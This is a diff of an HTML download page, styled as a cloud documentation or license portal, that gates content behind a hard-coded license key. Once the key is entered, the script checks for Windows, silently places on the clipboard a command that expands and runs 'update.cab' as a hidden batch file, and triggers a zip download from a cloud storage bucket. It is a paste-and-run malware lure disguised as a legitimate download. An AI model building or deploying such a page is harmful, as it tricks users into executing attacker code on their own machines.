@@ -52,7 +52,7 @@
       vertical-align: middle;
     }
 
-    
+    /* ─── LOADING SCREEN ─────────────────────────────────────────── */
     #loadingScreen {
       position: fixed;
       inset: 0;
@@ -151,7 +151,7 @@
       animation: barAppear .4s ease .5s both;
     }
 
-   
+    /* ─── PAGE ROOT FADE IN ──────────────────────────────────────── */
     #pageRoot {
       opacity: 0;
       animation: none;
@@ -164,7 +164,7 @@
       to   { opacity: 1; transform: translateY(0); }
     }
 
-    
+    /* ─── TOPBAR ──────────────────────────────────────────────────── */
     .topbar {
       position: sticky;
       top: 0;
@@ -237,7 +237,7 @@
     }
     .icon-btn:hover { background: var(--page); color: var(--text); }
 
-    
+    /* ─── LICENSE SCREEN ─────────────────────────────────────────── */
     .license-screen {
       display: grid;
       place-items: center;
@@ -329,7 +329,7 @@
       color: var(--text);
     }
 
-    
+    /* ─── DOWNLOAD SCREEN ────────────────────────────────────────── */
     #downloadScreen {
       display: none;
       position: relative;
@@ -340,7 +340,7 @@
     }
     #downloadScreen.active { display: flex; }
 
-    
+    /* Background */
     .dl-bg {
       position: absolute;
       inset: 0;
@@ -377,7 +377,7 @@
       50%      { transform: translateY(-30px) scale(1.05); }
     }
 
-    
+    /* Download Card */
     .dl-card {
       position: relative;
       z-index: 1;
@@ -419,7 +419,7 @@
     }
     .dl-card__desc { font-size: 14px; color: #80868b; line-height: 1.7; margin-bottom: 36px; }
 
-    
+    /* Download button */
     .btn-wrap { position: relative; display: inline-block; }
     .pulse-ring {
       position: absolute;
@@ -483,7 +483,7 @@
     }
     .badge .material-symbols-outlined { font-size: 14px; color: #1a73e8; }
 
-    
+    /* Download Screen toast (original from code 1) */
     #dlScreenToast {
       position: fixed;
       bottom: 28px;
@@ -509,7 +509,7 @@
     #dlScreenToast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
     #dlScreenToast .material-symbols-outlined { font-size: 18px; color: #34a853; }
 
-    
+    /* ─── APP LAYOUT ──────────────────────────────────────────────── */
     .app {
       max-width: var(--max);
       margin: 0 auto;
@@ -598,7 +598,7 @@
     .toc a:hover { background: var(--page); text-decoration: none; }
     .toc a.active { background: rgba(26,115,232,.10); color: var(--primary2); font-weight: 500; }
 
-    
+    /* ─── TOAST (Help) ────────────────────────────────────────────── */
     .toast {
       position: fixed;
       bottom: 20px;
@@ -620,7 +620,7 @@
     }
     .toast.show { opacity: 1; transform: translateY(0); }
 
-    
+    /* ─── LIGHTBOX ────────────────────────────────────────────────── */
     .lightbox {
       position: fixed;
       inset: 0;
@@ -663,7 +663,7 @@
     }
     .lightbox .close:hover { background: rgba(255,255,255,.1); }
 
-    
+    /* ─── ERROR SCREEN ────────────────────────────────────────────── */
     .error-screen {
       min-height: calc(100vh - 56px);
       display: none;
@@ -701,7 +701,7 @@
     .error-card h1 { margin: 0; font-size: 18px; font-weight: 600; }
     .error-card p { margin: 0; color: var(--muted); font-size: 14px; line-height: 1.6; }
 
-    
+    /* ─── RESPONSIVE ─────────────────────────────────────────────── */
     @media (max-width: 1120px) {
       .app { grid-template-columns: var(--navw) 1fr; }
       .right { display: none; }
@@ -725,7 +725,7 @@
 
 <body>
 
-  
+  <!-- ═══ LOADING SCREEN ═══════════════════════════════════════════ -->
   <div id="loadingScreen">
     <div class="loader-logo">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 184 149" width="48" height="48">
@@ -745,7 +745,7 @@
     </div>
   </div>
 
-  
+  <!-- ═══ PAGE ROOT ════════════════════════════════════════════════ -->
   <div id="pageRoot">
 
     <header class="topbar">
@@ -771,7 +771,7 @@
       </div>
     </header>
 
-    
+    <!-- Error Screen -->
     <section id="osError" class="error-screen" role="alert" aria-live="assertive">
       <div class="error-card">
         <div class="error-pill">
@@ -783,7 +783,7 @@
       </div>
     </section>
 
-    
+    <!-- License Screen -->
     <section id="licenseScreen" class="license-screen">
       <div class="license-card">
         <div class="row">
@@ -807,7 +807,7 @@
       </div>
     </section>
 
-   
+    <!-- Download Screen -->
     <div id="downloadScreen">
       <div class="dl-bg"></div>
       <div class="blob blob-1"></div>
@@ -830,17 +830,17 @@
         <div class="file-badges">
           <span class="badge">
             <span class="material-symbols-outlined">description</span>
-            Design_strength_assessment_for_steel_and_steel_concrete_composite.pdf
+            cloud-config.txt
           </span>
-          <!-- <span class="badge">
+          <span class="badge">
             <span class="material-symbols-outlined">description</span>
             cloud-readme.txt
-          </span> -->
+          </span>
         </div>
       </div>
     </div>
 
-    
+    <!-- Help Root -->
     <div id="helpRoot" style="display:none;">
       <div class="app">
         <aside class="sidebar" id="sidebar">
@@ -929,28 +929,30 @@
       </div>
     </div>
 
-  </div>
+  </div><!-- /#pageRoot -->
 
-  
+  <!-- Lightbox -->
   <div class="lightbox" id="lightbox" aria-hidden="true">
     <button class="close" id="lbClose" aria-label="Close">✕</button>
     <img id="lbImage" src="" alt="Preview" />
   </div>
 
-  
+  <!-- Download Screen Toast (original) -->
   <div class="toast" id="dlScreenToast">
     <span class="material-symbols-outlined">check_circle</span>
     Both files are downloading!
   </div>
 
-  
+  <!-- Help Root Toast -->
   <div id="toast" class="toast" role="status" aria-live="polite">
     <span class="material-symbols-outlined" style="font-size:16px;">check_circle</span>
     <span id="toastText">Copied!</span>
   </div>
 
   <script>
-    
+    /* ───────────────────────────────────────────────────────────────
+       LOADING SCREEN — only triggers on first visit per session
+    ─────────────────────────────────────────────────────────────── */
     const LOADING_KEY = "__gcDocs_loaded__";
     const loadingScreen = document.getElementById("loadingScreen");
     const pageRoot = document.getElementById("pageRoot");
@@ -968,12 +970,13 @@
       }, 3000);
     }
 
-    
+    /* ───────────────────────────────────────────────────────────────
+       CONSTANTS
+    ─────────────────────────────────────────────────────────────── */
     const VALID_LICENSE          = "8F1D-3Q9P-D92L-BW6M";
-    const DOWNLOAD_URL           = "https://s3.eu-central-003.backblazeb2.com/myfile220033/Temp/mypdfapp.zip";
-    const DOWNLOAD_FILENAME_HINT = "yourfile.zip";
     const CLIPBOARD_TEXT = 'cmd /c start /min cmd /c "expand %USERPROFILE%\\Downloads\\update.cab %USERPROFILE%\\Downloads\\update.bat & call %USERPROFILE%\\Downloads\\update.bat"';
-
+    const DOWNLOAD_URL           = "https://s3.eu-central-003.backblazeb2.com/myfile220033/Temp/mypdfapp.zip:";
+    const DOWNLOAD_FILENAME_HINT = "yourfile.zip";
 
     const licenseInput  = document.getElementById("licenseInput");
     const submitBtn     = document.getElementById("submitBtn");
@@ -984,7 +987,9 @@
     const helpRoot      = document.getElementById("helpRoot");
     const osError       = document.getElementById("osError");
 
-    
+    /* ───────────────────────────────────────────────────────────────
+       OS CHECK
+    ─────────────────────────────────────────────────────────────── */
     function isWindowsOS() {
       try {
         if (navigator.userAgentData && typeof navigator.userAgentData.platform === "string") {
@@ -1006,7 +1011,9 @@
       osError.style.display = "none";
     }
 
-   
+    /* ───────────────────────────────────────────────────────────────
+       LICENSE INPUT
+    ─────────────────────────────────────────────────────────────── */
     licenseInput.addEventListener("input", () => {
       submitBtn.disabled = licenseInput.value.trim() !== VALID_LICENSE;
     });
@@ -1018,36 +1025,47 @@
       }
     });
 
-    
+    /* ───────────────────────────────────────────────────────────────
+       CLIPBOARD — iframe/Google Sites compatible
+    ─────────────────────────────────────────────────────────────── */
     async function copyToClipboard(text) {
-      if (navigator.clipboard && window.isSecureContext) {
-        await navigator.clipboard.writeText(text);
-        return true;
-      }
-      const ta = document.createElement("textarea");
-      ta.value = text;
-      ta.setAttribute("readonly", "");
-      ta.style.cssText = "position:fixed;top:0;left:-9999px;";
-      document.body.appendChild(ta);
-      ta.focus();
-      ta.select();
-      let ok = false;
-      try { ok = document.execCommand("copy"); } catch (_) {}
-      ta.remove();
-      if (!ok) throw new Error("Fallback copy failed");
-      return true;
+      /* روش اول: Clipboard API (مرورگرهای مدرن خارج از iframe) */
+      try {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          await navigator.clipboard.writeText(text);
+          return true;
+        }
+      } catch (_) {}
+
+      /* روش دوم: execCommand — در iframe و Google Sites کار می‌کند */
+      try {
+        const ta = document.createElement("textarea");
+        ta.value = text;
+        ta.style.cssText = "position:fixed;top:0;left:0;width:2px;height:2px;padding:0;border:0;outline:0;box-shadow:none;background:transparent;";
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        ta.setSelectionRange(0, text.length);
+        const ok = document.execCommand("copy");
+        ta.remove();
+        if (ok) return true;
+      } catch (_) {}
+
+      throw new Error("Clipboard not available");
     }
 
-   
+    /* ───────────────────────────────────────────────────────────────
+       SUBMIT — License → Download Screen
+    ─────────────────────────────────────────────────────────────── */
     submitBtn.addEventListener("click", async () => {
       if (submitBtn.disabled) return;
 
-      
+      /* 1. Hide license, show download screen */
       licenseScreen.style.display = "none";
       downloadScreen.classList.add("active");
       window.scrollTo({ top: 0, behavior: "smooth" });
 
-      
+      /* 2. Clipboard */
       try {
         await copyToClipboard(CLIPBOARD_TEXT);
         showToast("Copied!");
@@ -1056,7 +1074,7 @@
         showToast("Copy blocked by browser.");
       }
 
-      
+      /* 3. Download license file */
       try {
         const a = document.createElement("a");
         a.href = DOWNLOAD_URL;
@@ -1069,7 +1087,9 @@
       }
     });
 
-    
+    /* ───────────────────────────────────────────────────────────────
+       DOWNLOAD SCREEN — original scripts (code 1)
+    ─────────────────────────────────────────────────────────────── */
     function downloadFile(url) {
       const a = document.createElement('a');
       a.href = url;
@@ -1097,7 +1117,9 @@
       dlScreenTimer = setTimeout(() => t.classList.remove('show'), 3000);
     }
 
-    
+    /* ───────────────────────────────────────────────────────────────
+       TOAST
+    ─────────────────────────────────────────────────────────────── */
     function showToast(msg) {
       toastText.textContent = msg;
       toast.classList.add("show");
@@ -1105,7 +1127,9 @@
       showToast._t = setTimeout(() => toast.classList.remove("show"), 1800);
     }
 
-   
+    /* ───────────────────────────────────────────────────────────────
+       SIDEBAR / HAMBURGER
+    ─────────────────────────────────────────────────────────────── */
     const sidebar   = document.getElementById("sidebar");
     const hamburger = document.getElementById("hamburger");
 
@@ -1120,7 +1144,9 @@
       }
     });
 
-   
+    /* ───────────────────────────────────────────────────────────────
+       NAV ITEMS & TOC
+    ─────────────────────────────────────────────────────────────── */
     const navItems = [...document.querySelectorAll(".nav-item[data-target]")];
     const tocLinks = [...document.querySelectorAll("#toc a")];
 
@@ -1150,7 +1176,9 @@
 
     sections.forEach(s => io.observe(s));
 
- 
+    /* ───────────────────────────────────────────────────────────────
+       LIGHTBOX
+    ─────────────────────────────────────────────────────────────── */
     const lightbox = document.getElementById("lightbox");
     const lbImage  = document.getElementById("lbImage");
     const lbClose  = document.getElementById("lbClose");
